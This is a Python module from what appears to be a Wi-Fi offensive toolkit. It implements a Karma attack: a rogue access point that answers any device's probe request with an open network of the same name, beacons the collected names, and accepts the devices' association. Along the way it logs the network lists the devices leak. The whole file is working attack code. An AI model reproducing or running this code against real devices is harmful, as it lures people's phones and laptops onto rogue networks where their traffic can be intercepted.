"""KarmaAP: an opportunistic open-network responder (mechanism only, no UI/log).

Unlike ``eviltwin.FakeAP`` (one fixed target cloned from a captured beacon), Karma has no target
at all: it answers *any* client's directed probe request with an open twin of the exact SSID
asked for, banking on the client auto-joining a network it believes it already knows -- the
classic Karma attack, restricted to open networks (see ``docs/planning/FEATURES.md`` for why the
WPA/PSK case, "MANA", isn't attempted here: modern OSes verify the security type before
auto-joining, so answering a WPA probe with an open twin rarely gets anywhere).

Every discovered SSID shares one BSSID: the active-monitor mechanism (``set_fake_mac``) can only
HW-ACK one forged address at a time on this hardware, so distinct virtual networks are
distinguished by name only, the same way any single-radio software AP fakes multiple SSIDs
without true multi-BSSID hardware. The beacon loop round-robins whichever SSIDs have been probed
so far; a client that then associates does so exactly like an open ``FakeAP`` target -- no 4-way,
since there's nothing to open.
"""
from __future__ import annotations

import asyncio
import os
import time
from dataclasses import dataclass, field
from typing import Callable, Dict, List, Optional

from wifit3.dot11.ap import auth_resp, assoc_resp, open_beacon
from wifit3.dot11.mac import mac_to_str, str_to_mac
from wifit3.dot11.probe import probe_resp

_BEACON_PERIOD_S = 100 * 1024 / 1_000_000       # 100 TU, one SSID advanced per tick


@dataclass
class KarmaClient:
    ssid: str
    assoced: bool = False
    first_seen: float = 0.0
    last_advance: float = 0.0


@dataclass
class KarmaApStats:
    probes_seen: int = 0
    auth: int = 0
    assoc: int = 0
    ssids_seen: List[str] = field(default_factory=list)   # insertion order = leaked PNL order
    clients: Dict[str, KarmaClient] = field(default_factory=dict)


class KarmaAP:
    def __init__(self, iface, channel: int, rx_source=None,
                 on_client_joined: Optional[Callable[[str, str], None]] = None):
        self.iface = iface
        self.channel = channel
        self.rx_source = rx_source
        self.on_client_joined = on_client_joined or (lambda _mac, _ssid: None)
        self.bssid: Optional[bytes] = None
        self.stats = KarmaApStats()
        self._beacon_idx = 0
        self._running = False
        self._beacon_task: Optional[asyncio.Task] = None

    # ----- lifecycle ---------------------------------------------------------

    async def start(self) -> None:
        self._running = True
        if self.iface.current_channel != self.channel:
            await self.iface.set_channel(self.channel)
        assumed = await self.iface.set_fake_mac(None, None)
        if assumed is not None:
            self.bssid = str_to_mac(assumed)
        elif getattr(self.iface, "mac_address", None):
            self.bssid = str_to_mac(self.iface.mac_address)
        else:
            self.bssid = bytes([0x02]) + os.urandom(5)      # locally-administered, last resort
        if self.rx_source is not None:
            self.rx_source.register_rx_callback(self.on_rx)
        self._beacon_task = asyncio.create_task(self._beacon_loop())

    async def stop(self) -> None:
        self._running = False
        if self._beacon_task is not None:
            self._beacon_task.cancel()
        if self.rx_source is not None:
            self.rx_source.unregister_rx_callback(self.on_rx)
        try:
            await self.iface.clear_fake_mac()
        except Exception:                               # noqa: BLE001
            pass

    async def _beacon_loop(self) -> None:
        while self._running:
            if self.stats.ssids_seen:
                ssid = self.stats.ssids_seen[self._beacon_idx % len(self.stats.ssids_seen)]
                self._beacon_idx += 1
                await self.iface.send_no_wait(open_beacon(self.bssid, ssid, self.channel))
            await asyncio.sleep(_BEACON_PERIOD_S)

    # ----- responder (sync; injects via _tx) ---------------------------------

    def on_rx(self, pkt) -> None:
        raw = pkt.raw
        if len(raw) < 24 or pkt.type_id != 0:
            return
        subtype = pkt.subtype_id
        client = raw[10:16]
        if subtype == 0x04:                             # probe request
            self._on_probe(pkt, client)
            return
        if raw[4:10] != self.bssid:                      # auth/assoc must be addressed to us
            return
        if subtype == 0x0B:                              # authentication
            self._on_auth(client)
        elif subtype in (0x00, 0x02):                     # (re)association request
            self._on_assoc(pkt, client)

    def _on_probe(self, pkt, client: bytes) -> None:
        ssid = getattr(pkt, "ssid", None)
        if not ssid or ssid == "<hidden>":
            return                                        # Karma only answers directed, named probes
        self.stats.probes_seen += 1
        if ssid not in self.stats.ssids_seen:
            self.stats.ssids_seen.append(ssid)
        resp = probe_resp(self.bssid, ssid, self.channel, secured=False)
        self._tx(resp[:4] + client + resp[10:])

    def _on_auth(self, client: bytes) -> None:
        self.stats.auth += 1
        self._tx(auth_resp(self.bssid, client))

    def _on_assoc(self, pkt, client: bytes) -> None:
        ssid = getattr(pkt, "ssid", None) or "?"
        self.stats.assoc += 1
        cs = mac_to_str(client)
        now = time.time()
        rec = self.stats.clients.get(cs)
        is_new = rec is None
        if is_new:
            rec = KarmaClient(ssid=ssid, first_seen=now)
            self.stats.clients[cs] = rec
        rec.ssid = ssid
        rec.assoced = True
        rec.last_advance = now
        self._tx(assoc_resp(self.bssid, client, secured=False))
        if is_new:
            self.on_client_joined(cs, ssid)

    def _tx(self, frame: bytes) -> None:
        asyncio.create_task(self.iface.send_no_wait(frame))
